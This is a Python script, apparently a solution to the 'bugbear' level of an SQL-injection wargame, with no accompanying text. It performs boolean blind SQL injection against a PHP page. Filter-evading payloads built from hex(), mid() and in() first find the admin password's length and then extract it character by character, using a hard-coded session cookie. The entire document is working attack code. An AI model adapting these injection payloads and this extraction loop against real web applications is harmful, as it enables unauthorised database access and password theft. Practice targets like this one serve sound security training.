import requests, urllib

url = "https://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php"

cookie = {"PHPSESSID":"oj8l6aabt4juigeiduqcn1jl73"}

### get password length ###

plen = 1
while True:
    param = {"pw": "a", "no" : "0||hex(mid(id,1,1))in(61)&&length(pw)<>" + str(plen)}
    response = requests.get(url, params=param, cookies=cookie)
    if "<h2>Hello admin</h2>" not in response.text:
        break
    else:
        print("[*] trying get password length.. now " + str(plen))
        plen += 1

print("[*] Password length is " + str(plen))

password = ""

for i in range(plen):
    for j in range(256):
        j = (j + 32) % 256
        param = {"pw": "a", "no" : "0||hex(mid(id,1,1))in(61)&&hex(mid(pw," + str(i+1) + ",1))in(" + str(hex(j)).replace("0x", "")+")"}
        response = requests.get(url, params=param, cookies=cookie)
        if "<h2>Hello admin</h2>" in response.text:
            password += chr(j)
            break
        else:
            print("[*] searching " + str(i+1) + " password character.. now " + str(j))
            plen += 1
    print("[*] found password " + str(i+1) +" character! now : " + password)

print("[*] password is " + password)
